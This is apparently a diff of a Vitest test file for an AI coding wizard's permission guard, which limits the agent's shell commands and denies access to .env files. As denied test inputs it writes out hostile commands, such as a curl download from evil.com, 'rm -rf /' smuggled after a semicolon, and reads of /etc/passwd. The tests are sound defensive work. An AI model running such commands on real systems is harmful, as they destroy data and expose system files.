@@ -1,5 +1,22 @@
-import { vi, describe, it, expect, beforeEach, type Mock } from 'vitest';
-import { runAgent, createStopHook } from '../agent-interface';
+import {
+  vi,
+  describe,
+  it,
+  expect,
+  beforeEach,
+  afterEach,
+  type Mock,
+} from 'vitest';
+import {
+  runAgent,
+  createStopHook,
+  wizardCanUseTool,
+  buildWizardMetadata,
+  isSkillInstallCommand,
+  matchesAllowedPrefix,
+  AgentErrorType,
+  AgentSignals,
+} from '../agent-interface';
 import type { WizardOptions } from '../../utils/types';
 import type { SpinnerHandle } from '../../ui';
 import {
@@ -45,6 +62,8 @@ const mockUIInstance = {
   syncTodos: vi.fn(),
   groupMultiselect: vi.fn(),
   multiselect: vi.fn(),
+  heartbeat: vi.fn(),
+  setEventPlan: vi.fn(),
 };
 vi.mock('../../ui', () => ({
   getUI: () => mockUIInstance,
@@ -211,7 +230,245 @@ describe('runAgent', () => {
       expect(result.message).toContain('API Error');
     });
 
-    it('should suppress user-facing errors when SDK yields error result after success', async () => {
+    it('should report MCP_MISSING when agent output contains the error signal', async () => {
+      function* mcpMissingGenerator() {
+        yield {
+          type: 'assistant',
+          message: {
+            role: 'assistant',
+            content: [
+              {
+                type: 'text',
+                text: `${AgentSignals.ERROR_MCP_MISSING} Could not load skill menu`,
+              },
+            ],
+          },
+        };
+        yield {
+          type: 'result',
+          subtype: 'success',
+          is_error: false,
+          result: '',
+        };
+      }
+
+      mockQuery.mockReturnValue(mcpMissingGenerator());
+
+      const result = await runAgent(
+        defaultAgentConfig,
+        'test prompt',
+        defaultOptions,
+        mockSpinner as unknown as SpinnerHandle,
+      );
+
+      expect(result.error).toBe(AgentErrorType.MCP_MISSING);
+    });
+
+    it('should report RESOURCE_MISSING when agent output contains the error signal', async () => {
+      function* resourceMissingGenerator() {
+        yield {
+          type: 'assistant',
+          message: {
+            role: 'assistant',
+            content: [
+              {
+                type: 'text',
+                text: `${AgentSignals.ERROR_RESOURCE_MISSING} Could not find skill`,
+              },
+            ],
+          },
+        };
+        yield {
+          type: 'result',
+          subtype: 'success',
+          is_error: false,
+          result: '',
+        };
+      }
+
+      mockQuery.mockReturnValue(resourceMissingGenerator());
+
+      const result = await runAgent(
+        defaultAgentConfig,
+        'test prompt',
+        defaultOptions,
+        mockSpinner as unknown as SpinnerHandle,
+      );
+
+      expect(result.error).toBe(AgentErrorType.RESOURCE_MISSING);
+    });
+
+    it('should report RATE_LIMIT when agent output contains API Error 429', async () => {
+      function* rateLimitGenerator() {
+        yield {
+          type: 'result',
+          subtype: 'success',
+          is_error: false,
+          result: 'API Error: 429 Too Many Requests',
+        };
+      }
+
+      mockQuery.mockReturnValue(rateLimitGenerator());
+
+      const result = await runAgent(
+        defaultAgentConfig,
+        'test prompt',
+        defaultOptions,
+        mockSpinner as unknown as SpinnerHandle,
+      );
+
+      expect(result.error).toBe(AgentErrorType.RATE_LIMIT);
+      expect(result.message).toContain('API Error: 429');
+    });
+
+    it('should report API_ERROR when agent output contains a non-429 API Error', async () => {
+      function* apiErrorGenerator() {
+        yield {
+          type: 'result',
+          subtype: 'success',
+          is_error: false,
+          result: 'API Error: 500 Internal Server Error',
+        };
+      }
+
+      mockQuery.mockReturnValue(apiErrorGenerator());
+
+      const result = await runAgent(
+        defaultAgentConfig,
+        'test prompt',
+        defaultOptions,
+        mockSpinner as unknown as SpinnerHandle,
+      );
+
+      expect(result.error).toBe(AgentErrorType.API_ERROR);
+      expect(result.message).toContain('API Error: 500');
+    });
+  });
+
+  describe('stall retry', () => {
+    afterEach(() => {
+      vi.useRealTimers();
+    });
+
+    it('retries after a stall and succeeds on the second attempt', async () => {
+      vi.useFakeTimers();
+
+      let queryCallCount = 0;
+
+      mockQuery.mockImplementation(
+        (params: { options: Record<string, unknown> }) => {
+          queryCallCount++;
+          const signal = params.options.abortSignal as AbortSignal;
+
+          if (queryCallCount === 1) {
+            // Hang until aborted — no yield because the await always rejects first
+            // eslint-disable-next-line require-yield
+            return (async function* () {
+              await new Promise<never>((_, reject) => {
+                signal.addEventListener('abort', () =>
+                  reject(new Error('Stall aborted')),
+                );
+              });
+            })();
+          }
+
+          // Second attempt: succeed immediately
+          return (async function* () {
+            yield {
+              type: 'result',
+              subtype: 'success',
+              is_error: false,
+              result: '',
+            };
+          })();
+        },
+      );
+
+      const runPromise = runAgent(
+        defaultAgentConfig,
+        'test prompt',
+        defaultOptions,
+        mockSpinner as unknown as SpinnerHandle,
+        { successMessage: 'Done', errorMessage: 'Failed' },
+      );
+
+      // Trigger the stall timeout
+      await vi.advanceTimersByTimeAsync(20_001);
+
+      const result = await runPromise;
+
+      expect(result).toEqual({});
+      expect(queryCallCount).toBe(2);
+      expect(mockSpinner.stop).toHaveBeenCalledWith('Done');
+    });
+
+    it('throws after exhausting all retries', async () => {
+      vi.useFakeTimers();
+
+      let queryCallCount = 0;
+
+      mockQuery.mockImplementation(
+        (params: { options: Record<string, unknown> }) => {
+          queryCallCount++;
+          const signal = params.options.abortSignal as AbortSignal;
+          // eslint-disable-next-line require-yield
+          return (async function* () {
+            await new Promise<never>((_, reject) => {
+              signal.addEventListener('abort', () =>
+                reject(new Error('Stall aborted')),
+              );
+            });
+          })();
+        },
+      );
+
+      const runPromise = runAgent(
+        defaultAgentConfig,
+        'test prompt',
+        defaultOptions,
+        mockSpinner as unknown as SpinnerHandle,
+        { successMessage: 'Done', errorMessage: 'Failed' },
+      );
+
+      // Attach the rejection check BEFORE advancing timers so the promise has a
+      // .catch() handler and doesn't become an unhandled rejection mid-advance.
+      const rejectCheck = expect(runPromise).rejects.toThrow('Stall aborted');
+
+      // Single large advance — fires all 3 stall timers (3 × 20s) in sequence.
+      // advanceTimersByTimeAsync processes microtasks between each timer firing,
+      // so each retry's new timer gets registered before the next fires.
+      await vi.advanceTimersByTimeAsync(70_000);
+
+      await rejectCheck;
+      expect(queryCallCount).toBe(3); // MAX_RETRIES=2 → 3 total attempts
+    });
+
+    it('does not retry on non-stall errors', async () => {
+      let queryCallCount = 0;
+
+      mockQuery.mockImplementation(() => {
+        queryCallCount++;
+        // eslint-disable-next-line require-yield
+        return (async function* () {
+          throw new Error('Network failure');
+        })();
+      });
+
+      await expect(
+        runAgent(
+          defaultAgentConfig,
+          'test prompt',
+          defaultOptions,
+          mockSpinner as unknown as SpinnerHandle,
+        ),
+      ).rejects.toThrow('Network failure');
+
+      expect(queryCallCount).toBe(1); // No retry — not a stall
+    });
+  });
+
+  describe('race condition handling', () => {
+    it('should return success when agent completes successfully then SDK cleanup fails', async () => {
       // This test models actual SDK behavior where the SDK emits TWO result messages:
       // 1. SDK yields success result (num_turns: 105, is_error: false)
       // 2. SDK yields a SECOND result with is_error: true containing
@@ -352,5 +609,279 @@ describe('createStopHook', () => {
     hook(hookInput); // allow
     const extra = hook(hookInput); // still allow
     expect(extra).toEqual({});
+  });
+});
+
+describe('isSkillInstallCommand', () => {
+  it('allows a valid GitHub releases skill install', () => {
+    const cmd =
+      "mkdir -p .claude/skills/integration-nextjs && curl -sL 'https://github.com/Amplitude/context-mill/releases/download/v1.0.0/skill.tar.gz' | tar -xz -C .claude/skills/integration-nextjs";
+    expect(isSkillInstallCommand(cmd)).toBe(true);
+  });
+
+  it('allows a localhost dev skill install', () => {
+    const cmd =
+      "mkdir -p .claude/skills/test && curl -sL 'http://localhost:3000/skill.tar.gz' | tar -xz -C .claude/skills/test";
+    expect(isSkillInstallCommand(cmd)).toBe(true);
+  });
+
+  it('rejects a command that does not start with mkdir -p .claude/skills/', () => {
+    const cmd =
+      "curl -sL 'https://github.com/Amplitude/context-mill/releases/download/v1/skill.tar.gz'";
+    expect(isSkillInstallCommand(cmd)).toBe(false);
+  });
+
+  it('rejects a curl from an untrusted domain', () => {
+    const cmd =
+      "mkdir -p .claude/skills/evil && curl -sL 'https://evil.com/malware.sh'";
+    expect(isSkillInstallCommand(cmd)).toBe(false);
+  });
+
+  it('rejects a command with no curl at all', () => {
+    const cmd = 'mkdir -p .claude/skills/foo && echo done';
+    expect(isSkillInstallCommand(cmd)).toBe(false);
+  });
+});
+
+describe('matchesAllowedPrefix', () => {
+  it('allows npm install', () => {
+    expect(matchesAllowedPrefix('npm install')).toBe(true);
+  });
+
+  it('allows yarn add react', () => {
+    expect(matchesAllowedPrefix('yarn add react')).toBe(true);
+  });
+
+  it('allows pnpm run build', () => {
+    expect(matchesAllowedPrefix('pnpm run build')).toBe(true);
+  });
+
+  it('allows npm exec tsc', () => {
+    expect(matchesAllowedPrefix('npm exec tsc')).toBe(true);
+  });
+
+  it('allows standalone build commands (hugo, make)', () => {
+    expect(matchesAllowedPrefix('hugo')).toBe(true);
+    expect(matchesAllowedPrefix('make')).toBe(true);
+  });
+
+  it('denies unknown executables', () => {
+    expect(matchesAllowedPrefix('rm -rf /')).toBe(false);
+    expect(matchesAllowedPrefix('curl https://example.com')).toBe(false);
+  });
+
+  it('denies disallowed sub-commands even from known executables', () => {
+    expect(matchesAllowedPrefix('npm run dev')).toBe(false);
+    expect(matchesAllowedPrefix('npm run start')).toBe(false);
+    expect(matchesAllowedPrefix('npm run deploy')).toBe(false);
+  });
+
+  it('allows npm publish because "pub" is in SAFE_SCRIPTS (startsWith match for go pub)', () => {
+    // This is an intentional side-effect of the "pub" entry covering Go's pub sub-command.
+    expect(matchesAllowedPrefix('npm publish')).toBe(true);
+  });
+
+  it('allows linting tools as sub-commands', () => {
+    expect(matchesAllowedPrefix('npm run eslint')).toBe(true);
+    expect(matchesAllowedPrefix('npx prettier --check .')).toBe(true);
+  });
+});
+
+describe('wizardCanUseTool', () => {
+  describe('file operations on .env files', () => {
+    it('denies Read on .env', () => {
+      const result = wizardCanUseTool('Read', { file_path: '/project/.env' });
+      expect(result.behavior).toBe('deny');
+    });
+
+    it('denies Write on .env.local', () => {
+      const result = wizardCanUseTool('Write', {
+        file_path: '/project/.env.local',
+      });
+      expect(result.behavior).toBe('deny');
+    });
+
+    it('denies Edit on .env.production', () => {
+      const result = wizardCanUseTool('Edit', {
+        file_path: '/project/.env.production',
+      });
+      expect(result.behavior).toBe('deny');
+    });
+
+    it('allows Read on a regular file', () => {
+      const result = wizardCanUseTool('Read', {
+        file_path: '/project/src/index.ts',
+      });
+      expect(result.behavior).toBe('allow');
+    });
+
+    it('allows Write on a non-env file', () => {
+      const result = wizardCanUseTool('Write', {
+        file_path: '/project/src/analytics.ts',
+      });
+      expect(result.behavior).toBe('allow');
+    });
+  });
+
+  describe('Grep', () => {
+    it('denies Grep directly targeting a .env file', () => {
+      const result = wizardCanUseTool('Grep', { path: '/project/.env' });
+      expect(result.behavior).toBe('deny');
+    });
+
+    it('allows Grep on a directory (ripgrep skips dotfiles by default)', () => {
+      const result = wizardCanUseTool('Grep', { path: '/project/src' });
+      expect(result.behavior).toBe('allow');
+    });
+
+    it('allows Grep with no path', () => {
+      const result = wizardCanUseTool('Grep', { pattern: 'amplitude' });
+      expect(result.behavior).toBe('allow');
+    });
+  });
+
+  describe('non-Bash tools', () => {
+    it('allows Glob unconditionally', () => {
+      expect(wizardCanUseTool('Glob', { pattern: '**/*.ts' }).behavior).toBe(
+        'allow',
+      );
+    });
+
+    it('allows ListMcpResourcesTool unconditionally', () => {
+      expect(wizardCanUseTool('ListMcpResourcesTool', {}).behavior).toBe(
+        'allow',
+      );
+    });
+  });
+
+  describe('Bash — dangerous operators', () => {
+    it('denies semicolon', () => {
+      expect(
+        wizardCanUseTool('Bash', { command: 'npm install; rm -rf /' }).behavior,
+      ).toBe('deny');
+    });
+
+    it('denies backtick', () => {
+      expect(
+        wizardCanUseTool('Bash', { command: 'echo `cat /etc/passwd`' })
+          .behavior,
+      ).toBe('deny');
+    });
+
+    it('denies dollar-paren subshell', () => {
+      expect(
+        wizardCanUseTool('Bash', { command: 'echo $(whoami)' }).behavior,
+      ).toBe('deny');
+    });
+  });
+
+  describe('Bash — skill installation', () => {
+    it('allows Amplitude skill install from GitHub releases', () => {
+      const cmd =
+        "mkdir -p .claude/skills/integration-nextjs && curl -sL 'https://github.com/Amplitude/context-mill/releases/download/v1/skill.tar.gz' | tar -xz -C .claude/skills/integration-nextjs";
+      expect(wizardCanUseTool('Bash', { command: cmd }).behavior).toBe('allow');
+    });
+  });
+
+  describe('Bash — pipe to tail/head', () => {
+    it('allows npm install piped to tail', () => {
+      const result = wizardCanUseTool('Bash', {
+        command: 'npm install | tail -n 20',
+      });
+      expect(result.behavior).toBe('allow');
+    });
+
+    it('allows stderr redirect then pipe to head', () => {
+      const result = wizardCanUseTool('Bash', {
+        command: 'npm run build 2>&1 | head -n 50',
+      });
+      expect(result.behavior).toBe('allow');
+    });
+
+    it('denies pipe to non-tail/head command', () => {
+      const result = wizardCanUseTool('Bash', {
+        command: 'npm install | grep error',
+      });
+      expect(result.behavior).toBe('deny');
+    });
+
+    it('denies multiple pipes even ending in tail', () => {
+      const result = wizardCanUseTool('Bash', {
+        command: 'npm install | grep error | tail -n 5',
+      });
+      expect(result.behavior).toBe('deny');
+    });
+  });
+
+  describe('Bash — allowed package manager commands', () => {
+    it('allows npm install', () => {
+      expect(
+        wizardCanUseTool('Bash', { command: 'npm install' }).behavior,
+      ).toBe('allow');
+    });
+
+    it('allows pnpm add @amplitude/analytics-browser', () => {
+      expect(
+        wizardCanUseTool('Bash', {
+          command: 'pnpm add @amplitude/analytics-browser',
+        }).behavior,
+      ).toBe('allow');
+    });
+
+    it('allows yarn build', () => {
+      expect(wizardCanUseTool('Bash', { command: 'yarn build' }).behavior).toBe(
+        'allow',
+      );
+    });
+
+    it('allows go get', () => {
+      expect(
+        wizardCanUseTool('Bash', { command: 'go get ./...' }).behavior,
+      ).toBe('allow');
+    });
+  });
+
+  describe('Bash — denied commands', () => {
+    it('denies arbitrary shell commands', () => {
+      expect(
+        wizardCanUseTool('Bash', { command: 'cat /etc/passwd' }).behavior,
+      ).toBe('deny');
+    });
+
+    it('denies npm run dev (not in safe scripts)', () => {
+      expect(
+        wizardCanUseTool('Bash', { command: 'npm run dev' }).behavior,
+      ).toBe('deny');
+    });
+
+    it('denies && chaining outside of skill install', () => {
+      expect(
+        wizardCanUseTool('Bash', {
+          command: 'npm install && npm run deploy',
+        }).behavior,
+      ).toBe('deny');
+    });
+  });
+});
+
+describe('buildWizardMetadata', () => {
+  it('returns base variant when no flags are provided', () => {
+    const result = buildWizardMetadata({});
+    expect(result).toEqual({ VARIANT: 'base' });
+  });
+
+  it('returns the matching variant when the flag is set', () => {
+    const result = buildWizardMetadata({ 'wizard-variant': 'subagents' });
+    expect(result).toEqual({ VARIANT: 'subagents' });
+  });
+
+  it('falls back to base variant for an unknown flag value', () => {
+    const result = buildWizardMetadata({ 'wizard-variant': 'nonexistent' });
+    expect(result).toEqual({ VARIANT: 'base' });
+  });
+
+  it('ignores unrelated flags', () => {
+    const result = buildWizardMetadata({ 'other-flag': 'value' });
+    expect(result).toEqual({ VARIANT: 'base' });
   });
 });
